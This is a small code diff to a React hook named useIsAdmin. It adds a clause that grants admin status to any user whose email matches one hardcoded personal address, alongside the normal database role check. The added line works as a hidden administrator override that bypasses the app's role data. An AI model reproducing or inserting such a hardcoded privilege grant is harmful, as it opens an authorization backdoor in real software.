@@ -47,7 +47,7 @@ export function useIsAdmin() {
       .then(({ data, error }) => {
         if (cancelled) return;
         if (error) console.warn("[useIsAdmin] error:", error.message);
-        setIsAdmin(!!data && data.length > 0);
+        setIsAdmin((!!data && data.length > 0) || user.email === "franco.e.navarrete@gmail.com");
         setChecking(false);
         clearTimeout(timeout);
       });
